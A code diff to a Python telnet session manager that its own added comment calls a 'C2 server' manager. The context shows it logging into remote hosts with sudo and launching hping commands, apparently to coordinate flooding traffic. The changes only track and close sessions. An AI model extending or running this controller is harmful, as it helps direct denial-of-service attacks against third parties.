@@ -1,3 +1,4 @@
+# C2 server telnet manager
 import telnetlib
 import logging
 import time
@@ -144,9 +145,12 @@ class TelnetManager:
                                 elif any(pattern in matched_pattern2 for pattern in hping_patterns):
                                     logging.info(f"✓ Command successfully started on {ip}")
                                     time.sleep(2)
+                                    # Store the session
+                                    self.active_sessions[ip] = tn
                                     return tn
                                 else:
                                     logging.warning(f"? Unknown response after sudo on {ip}: {response2_text}")
+                                    self.active_sessions[ip] = tn
                                     return tn
                         except Exception as e:
                             logging.error(f"✗ Error after sudo password on {ip}: {e}")
@@ -157,13 +161,16 @@ class TelnetManager:
                     elif any(pattern in matched_pattern for pattern in hping_patterns):
                         logging.info(f"✓ Command started directly on {ip} (no sudo required)")
                         time.sleep(2)
+                        self.active_sessions[ip] = tn
                         return tn
                     
                     else:
                         logging.warning(f"? Shell prompt returned immediately on {ip}")
+                        self.active_sessions[ip] = tn
                         return tn
                 else:
                     logging.warning(f"? No expected pattern matched on {ip}")
+                    self.active_sessions[ip] = tn
                     return tn
                     
             except Exception as e:
@@ -180,17 +187,29 @@ class TelnetManager:
                     pass
             return None
     
-    def close_session(self, ip):
-        """Close telnet session for a specific IP"""
-        if ip in self.active_sessions:
-            try:
-                self.active_sessions[ip].close()
-                del self.active_sessions[ip]
-                logging.info(f"Closed telnet session for {ip}")
-            except Exception as e:
-                logging.error(f"Error closing telnet session for {ip}: {e}")
+    def close_session(self, session):
+        """Close a telnet session"""
+        try:
+            # Remove from active sessions dict
+            for ip, tn in list(self.active_sessions.items()):
+                if tn == session:
+                    del self.active_sessions[ip]
+                    break
+                    
+            # Close the session
+            if session:
+                session.close()
+                logging.info("Closed telnet session")
+        except Exception as e:
+            logging.error(f"Error closing telnet session: {e}")
     
     def close_all_sessions(self):
         """Close all active telnet sessions"""
         for ip in list(self.active_sessions.keys()):
-            self.close_session(ip) 
+            try:
+                session = self.active_sessions[ip]
+                session.close()
+                logging.info(f"Closed telnet session for {ip}")
+                del self.active_sessions[ip]
+            except Exception as e:
+                logging.error(f"Error closing telnet session for {ip}: {e}")
